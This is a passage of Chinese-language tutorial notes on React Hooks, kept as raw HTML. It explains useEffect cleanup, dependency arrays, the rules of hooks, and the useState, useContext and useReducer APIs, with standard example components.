class="hljs-params">status</span>) &#123;<br>    <span class="hljs-title function_">setIsOnline</span>(status.<span class="hljs-property">isOnline</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title class_">ChatAPI</span>.<span class="hljs-title function_">subscribeToFriendStatus</span>(props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>, handleStatusChange);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title class_">ChatAPI</span>.<span class="hljs-title function_">unsubscribeFromFriendStatus</span>(props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>, handleStatusChange);<br>    &#125;;<br>  &#125;);<br><br>  <span class="hljs-keyword">if</span> (isOnline === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Loading...&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> isOnline ? <span class="hljs-string">&#x27;Online&#x27;</span> : <span class="hljs-string">&#x27;Offline&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>数据获取，设置订阅以及手动更改 React 组件中的 DOM 都属于副作用。在 React 组件中有两种常见副作用操作：需要清除的和不需要清除的。</p><p>不需要清除的：</p><p>有时候，我们只想<strong>在 React 更新 DOM 之后运行一些额外的代码。</strong>比如发送网络请求，手动变更 DOM，记录日志，这些都是常见的无需清除的操作。因为我们在执行完这些操作之后，就可以忽略他们了。</p><p>在 React 的 class 组件中，<code>render</code> 函数是不应该有任何副作用的。一般来说，在这里执行操作太早了，我们基本上都希望在 React 更新 DOM 之后才执行我们的操作。这就是为什么在 React class 中，我们把副作用操作放到 <code>componentDidMount</code> 和 <code>componentDidUpdate</code> 函数中。很多情况下，我们希望在组件加载和更新时执行同样的操作。从概念上说，我们希望它在每次渲染之后执行 —— 但 React 的 class 组件没有提供这样的方法。即使我们提取出一个方法，我们还是要在两个地方调用它。现在让我们来看看如何使用 <code>useEffect</code> 执行相同的操作。</p><p><strong><code>useEffect</code> 做了什么？</strong> 通过使用这个 Hook，你可以告诉 React 组件需要在渲染后执行某些操作。React 会保存你传递的函数（我们将它称之为 “effect”），并且在执行 DOM 更新之后调用它。</p><p><strong>为什么在组件内部调用 <code>useEffect</code>？</strong> 将 <code>useEffect</code> 放在组件内部让我们可以在 effect 中直接访问 <code>count</code> state 变量（或其他 props）。我们不需要特殊的 API 来读取它 —— 它已经保存在函数作用域中。Hook 使用了 JavaScript 的闭包机制，而不用在 JavaScript 已经提供了解决方案的情况下，还引入特定的 React API。</p><p><strong><code>useEffect</code> 会在每次渲染后都执行吗？</strong> 是的，默认情况下，它在第一次渲染之后和每次更新之后都会执行。你可能会更容易接受 effect 发生在“渲染之后”这种概念，不用再去考虑“挂载”还是“更新”。React 保证了每次运行 effect 的同时，DOM 都已经更新完毕。</p><p>需要清除的：</p><p>之前，我们研究了如何使用不需要清除的副作用，还有一些副作用是需要清除的。例如<strong>订阅外部数据源</strong>。这种情况下，清除工作是非常重要的，可以防止引起内存泄露！</p><p>你可能认为需要单独的 effect 来执行清除操作。但由于添加和删除订阅的代码的紧密性，所以 <code>useEffect</code> 的设计是在同一个地方执行。如果你的 effect 返回一个函数，React 将会在执行清除操作时调用它：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">FriendStatus</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> [isOnline, setIsOnline] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleStatusChange</span>(<span class="hljs-params">status</span>) &#123;<br>      <span class="hljs-title function_">setIsOnline</span>(status.<span class="hljs-property">isOnline</span>);<br>    &#125;<br>    <span class="hljs-title class_">ChatAPI</span>.<span class="hljs-title function_">subscribeToFriendStatus</span>(props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>, handleStatusChange);<br>    <span class="hljs-comment">// Specify how to clean up after this effect:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title class_">ChatAPI</span>.<span class="hljs-title function_">unsubscribeFromFriendStatus</span>(props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>, handleStatusChange);<br>    &#125;;<br>  &#125;);<br><br>  <span class="hljs-keyword">if</span> (isOnline === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Loading...&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> isOnline ? <span class="hljs-string">&#x27;Online&#x27;</span> : <span class="hljs-string">&#x27;Offline&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>为什么要在 effect 中返回一个函数？</strong> 这是 effect 可选的清除机制。每个 effect 都可以返回一个清除函数。如此可以将添加和移除订阅的逻辑放在一起。它们都属于 effect 的一部分。</p><p><strong>React 何时清除 effect？</strong> React 会在组件卸载的时候执行清除操作。正如之前学到的，effect 在每次渲染的时候都会执行。这就是为什么 React <em>会</em>在执行当前 effect 之前对上一个 effect 进行清除。</p><p>通过跳过 Effect 进行性能优化：在某些情况下，每次渲染后都执行清理或者执行 effect 可能会导致性能问题。如果某些特定值在两次重渲染之间没有发生变化，你可以通知 React <strong>跳过</strong>对 effect 的调用，只要传递数组作为 <code>useEffect</code> 的第二个可选参数即可：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`You clicked <span class="hljs-subst">$&#123;count&#125;</span> times`</span>;<br>&#125;, [count]); <span class="hljs-comment">// 仅在 count 更改时更新</span><br></code></pre></td></tr></table></figure><p>对于有清除操作的 effect 同样适用：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleStatusChange</span>(<span class="hljs-params">status</span>) &#123;<br>    <span class="hljs-title function_">setIsOnline</span>(status.<span class="hljs-property">isOnline</span>);<br>  &#125;<br><br>  <span class="hljs-title class_">ChatAPI</span>.<span class="hljs-title function_">subscribeToFriendStatus</span>(props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>, handleStatusChange);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title class_">ChatAPI</span>.<span class="hljs-title function_">unsubscribeFromFriendStatus</span>(props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>, handleStatusChange);<br>  &#125;;<br>&#125;, [props.<span class="hljs-property">friend</span>.<span class="hljs-property">id</span>]); <span class="hljs-comment">// 仅在 props.friend.id 发生变化时，重新订阅</span><br></code></pre></td></tr></table></figure><p><strong>hook规则</strong></p><ol><li><p>不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的 React 函数的最顶层调用他们。</p></li><li><p>只在 React 函数中调用 Hook</p></li></ol><h3 id="28-hook-api索引"><a href="#28-hook-api索引" class="headerlink" title="28. hook api索引"></a>28. hook api索引</h3><p><strong>基础hook：</strong></p><p>&#x3D;&#x3D;useState&#x3D;&#x3D;：返回一个 state，以及更新 state 的函数。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState);<br><span class="hljs-title function_">setState</span>(newState);<br></code></pre></td></tr></table></figure><p>函数式更新：如果新的 state 需要通过使用先前的 state 计算得出，那么可以将函数传递给 <code>setState</code>。该函数将接收先前的 state，并返回一个更新后的值。下面的计数器组件示例展示了 <code>setState</code> 的两种用法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params">&#123;initialCount&#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(initialCount);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      Count: &#123;count&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(initialCount)&#125;&gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(prevCount =&gt; prevCount - 1)&#125;&gt;-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(prevCount =&gt; prevCount + 1)&#125;&gt;+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>与 class 组件中的 <code>setState</code> 方法不同，<code>useState</code> 不会自动合并更新对象。你可以用函数式的 <code>setState</code> 结合展开运算符来达到合并更新对象的效果。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prevState</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 也可以使用 Object.assign</span><br>  <span class="hljs-keyword">return</span> &#123;...prevState, ...updatedValues&#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>惰性初始 state：<code>initialState</code> 参数只会在组件的初始渲染中起作用，后续渲染时会被忽略。如果初始 state 需要通过复杂计算获得，则可以传入一个函数，在函数中计算并返回初始的 state，此函数只在初始渲染时被调用：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> initialState = <span class="hljs-title function_">someExpensiveComputation</span>(props);<br>  <span class="hljs-keyword">return</span> initialState;<br>&#125;);<br></code></pre></td></tr></table></figure><p>跳过 state 更新：调用 State Hook 的更新函数并传入当前的 state 时，React 将跳过子组件的渲染及 effect 的执行。（React 使用 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/is#Description"><code>Object.is</code> 比较算法</a> 来比较 state。）</p><p>需要注意的是，React 可能仍需要在跳过渲染前渲染该组件。不过由于 React 不会对组件树的“深层”节点进行不必要的渲染，所以大可不必担心。如果你在渲染期间执行了高开销的计算，则可以使用 <code>useMemo</code> 来进行优化。</p><p>&#x3D;&#x3D;useEffect&#x3D;&#x3D;：接收一个包含命令式、且可能有副作用代码的函数</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">useEffect</span>(didUpdate);<br></code></pre></td></tr></table></figure><p>在函数组件主体内（这里指在 React 渲染阶段）改变 DOM、添加订阅、设置定时器、记录日志以及执行其他包含副作用的操作都是不被允许的，因为这可能会产生莫名其妙的 bug 并破坏 UI 的一致性。</p><p>使用 <code>useEffect</code> 完成副作用操作。赋值给 <code>useEffect</code> 的函数会在组件渲染到屏幕之后执行。你可以把 effect 看作从 React 的纯函数式世界通往命令式世界的逃生通道。</p><p>清除 effect：通常，组件卸载时需要清除 effect 创建的诸如订阅或计时器 ID 等资源。要实现这一点，<code>useEffect</code> 函数需返回一个清除函数。以下就是一个创建订阅的例子：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> subscription = props.<span class="hljs-property">source</span>.<span class="hljs-title function_">subscribe</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 清除订阅</span><br>    subscription.<span class="hljs-title function_">unsubscribe</span>();<br>  &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>为防止内存泄漏，清除函数会在组件卸载前执行。另外，如果组件多次渲染（通常如此），则<strong>在执行下一个 effect 之前，上一个 effect 就已被清除</strong>。在上述示例中，意味着组件的每一次更新都会创建新的订阅。</p><p>effect的执行时机：与 <code>componentDidMount</code>、<code>componentDidUpdate</code> 不同的是，在浏览器完成布局与绘制<strong>之后</strong>，传给 <code>useEffect</code> 的函数会延迟调用。虽然 <code>useEffect</code> 会在浏览器绘制后延迟执行，但会保证在任何新的渲染前执行。React 将在组件更新前刷新上一轮渲染的 effect。</p><p>effect的条件执行：默认情况下，effect 会在每轮组件渲染完成后执行。这样的话，一旦 effect 的依赖发生变化，它就会被重新创建。然而，在某些场景下这么做可能会矫枉过正。比如，在上一章节的订阅示例中，我们不需要在每次组件更新时都创建新的订阅，而是仅需要在 <code>source</code> prop 改变时重新创建。要实现这一点，可以给 <code>useEffect</code> 传递第二个参数，它是 effect 所依赖的值数组。更新后的示例如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">useEffect</span>(<br>  <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> subscription = props.<span class="hljs-property">source</span>.<span class="hljs-title function_">subscribe</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      subscription.<span class="hljs-title function_">unsubscribe</span>();<br>    &#125;;<br>  &#125;,<br>  [props.<span class="hljs-property">source</span>],<br>);<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;useContext&#x3D;&#x3D;：接收一个 context 对象（<code>React.createContext</code> 的返回值）并返回该 context 的当前值。当前的 context 值由上层组件中距离当前组件最近的 <code>&lt;MyContext.Provider&gt;</code> 的 <code>value</code> prop 决定。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">MyContext</span>);<br></code></pre></td></tr></table></figure><p>当组件上层最近的 <code>&lt;MyContext.Provider&gt;</code> 更新时，该 Hook 会触发重渲染，并使用最新传递给 <code>MyContext</code> provider 的 context <code>value</code> 值。即使祖先使用 <a href="https://react.docschina.org/docs/react-api.html#reactmemo"><code>React.memo</code></a> 或 <a href="https://react.docschina.org/docs/react-component.html#shouldcomponentupdate"><code>shouldComponentUpdate</code></a>，也会在组件本身使用 <code>useContext</code> 时重新渲染。别忘记 <code>useContext</code> 的参数必须是 context 对象本身：<code>useContext(MyContext)</code></p><p>调用了 <code>useContext</code> 的组件总会在 context 值变化时重新渲染。如果重渲染组件的开销较大，你可以通过使用 memoization 来优化。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> themes = &#123;<br>  <span class="hljs-attr">light</span>: &#123;<br>    <span class="hljs-attr">foreground</span>: <span class="hljs-string">&quot;#000000&quot;</span>,<br>    <span class="hljs-attr">background</span>: <span class="hljs-string">&quot;#eeeeee&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">dark</span>: &#123;<br>    <span class="hljs-attr">foreground</span>: <span class="hljs-string">&quot;#ffffff&quot;</span>,<br>    <span class="hljs-attr">background</span>: <span class="hljs-string">&quot;#222222&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(themes.<span class="hljs-property">light</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;themes.dark&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Toolbar</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ThemedButton</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemedButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">background:</span> <span class="hljs-attr">theme.background</span>, <span class="hljs-attr">color:</span> <span class="hljs-attr">theme.foreground</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      I am styled by theme context!</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>以下介绍的 Hook，有些是上一节中基础 Hook 的变体，有些则仅在特殊情况下会用到。不用特意预先学习它们。</p><p>&#x3D;&#x3D;useReducer&#x3D;&#x3D;：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialArg, init);<br></code></pre></td></tr></table></figure><p><a href="https://react.docschina.org/docs/hooks-reference.html#usestate"><code>useState</code></a> 的替代方案。它接收一个形如 <code>(state, action) =&gt; newState</code> 的 reducer，并返回当前的 state 以及与其配套的 <code>dispatch</code> 方法。（如果你熟悉 Redux 的话，就已经知道它如何工作了。）</p><p>在某些场景下，<code>useReducer</code> 会比 <code>useState</code> 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。并且，使用 <code>useReducer</code> 还能给那些会触发深更新的组件做性能优化，因为你可以向子组件传递 <code>dispatch</code> 而不是回调函数。</p><p>以下是用 reducer 重写<code>useState</code> 一节的计数器示例：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> initialState = &#123;<span class="hljs-attr">count</span>: <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      Count: &#123;state.count&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;type: &#x27;decrement&#x27;&#125;)&#125;&gt;-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;type: &#x27;increment&#x27;&#125;)&#125;&gt;+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>React 会确保 <code>dispatch</code> 函数的标识是稳定的，并且不会在组件重新渲染时改变。这就是为什么可以安全地从 <code>useEffect</code> 或 <code>useCallback</code> 的依赖列表中省略 <code>dispatch</code>。</p><p>指定初始 state：有两种不同初始化 <code>useReducer</code> state 的方式，你可以根据使用场景选择其中的一种。将初始 state 作为第二个参数传入 <code>useReducer</code> 是最简单的方法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(<br>  reducer,<br>  &#123;<span class="hljs-attr">count</span>: initialCount&#125;  );<br></code></pre></td></tr></table></figure><p>惰性初始化：你可以选择惰性地创建初始 state。为此，需要将 <code>init</code> 函数作为 <code>useReducer</code> 的第三个参数传入，这样初始 state 将被设置为 <code>init(initialArg)</code>。这么做可以将用于计算 state 的逻辑提取到 reducer 外部，这也为将来对重置 state 的 action 做处理提供了便利：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">initialCount</span>) &#123;  <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: initialCount&#125;;&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span>&#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:      <span class="hljs-keyword">return</span> <span class="hljs-title function_">init</span>(action.<span class="hljs-property">payload</span>);    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params">&#123;initialCount&#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialCount, init);  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      Count: &#123;state.count&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;type: &#x27;reset&#x27;, payload: initialCount&#125;)&#125;&gt;        Reset</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;type: &#x27;decrement&#x27;&#125;)&#125;&gt;-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123;type: &#x27;increment&#x27;&#125;)&#125;&gt;+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>跳过 dispatch：如果 Reducer Hook 的返回值与当前 state 相同，React 将跳过子组件的渲染及副作用的执行。（React 使用 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/is#Description"><code>Object.is</code> 比较算法</a> 来比较 